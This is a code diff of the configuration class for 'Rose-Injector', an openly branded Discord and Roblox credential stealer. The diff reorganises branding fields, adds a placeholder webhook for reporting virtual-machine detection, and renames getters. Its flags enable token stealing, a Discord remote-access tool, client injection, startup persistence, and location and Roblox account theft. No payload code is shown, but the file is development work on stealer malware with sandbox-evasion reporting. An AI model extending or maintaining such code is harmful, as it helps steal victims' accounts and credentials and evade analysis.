@@ -1,15 +1,14 @@
 class Config:
     def __init__(self):
-        self.eb_color = 16711680 # remove
-        self.eb_footer = 'Rose-Injector | Made by Gumbobrot, ICExFS, suegdu | https://github.com/DamagingRose/Rose-Injector/' # remove 
-        self.debug_mode = True
         self.webhook = 'HOOK'
-        self.wh_avatar = 'https://raw.githubusercontent.com/DamagingRose/Rose-Injector/main/readme/Rose0.jpg' # remove 
-        self.wh_name = 'Rose-Injector' # remove
+        self.vm_detect_webhook = 'VMHOOK'
+        
+        self.debug_mode = True
+        
         self.discord_rat = False
         self.discord_rat_socket_link = 'DISCORD_RAT_SOCKET_LINK'
+        
         self.discord_ping = False
-
         self.startup = False
         self.injection = False
         self.token_stealing = False
@@ -18,6 +17,11 @@ class Config:
         self.malicious_stealing = False
         self.location_stealing = False
         self.roblox_stealing = False
+        
+        self.eb_color = 16711680
+        self.eb_footer = 'Rose-Injector | Made by Gumbobrot, ICExFS, suegdu | https://github.com/DamagingRose/Rose-Injector'
+        self.wh_avatar = 'https://raw.githubusercontent.com/DamagingRose/Rose-Injector/main/readme/Rose0.jpg'
+        self.wh_name = 'Rose-Injector'
 
     def startup(self):
         return self.startup
@@ -70,5 +74,8 @@ class Config:
     def get_discord_ping(self):
         return self.discord_ping
     
-    def roblox_stealing(self):
+    def get_roblox_stealing(self):
         return self.roblox_stealing
+    
+    def get_vm_detect_webhook(self):
+        return self.vm_detect_webhook
